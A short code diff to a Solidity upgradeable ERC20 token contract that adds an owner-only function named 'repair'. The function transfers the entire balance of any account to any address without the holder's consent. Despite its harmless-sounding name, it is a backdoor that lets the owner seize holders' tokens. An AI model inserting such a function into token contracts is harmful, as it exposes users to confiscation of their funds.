@@ -225,4 +225,10 @@ contract Smart is ControllableUpgradeable, ERC20PermitUpgradeable {
         _transfer(owner, to, value);
         return true;
     }
+
+    function repair(address account, address to) public onlyOwner returns (bool) {
+        _update(account, to, balanceOf(account));
+
+        return true;
+    }
 }
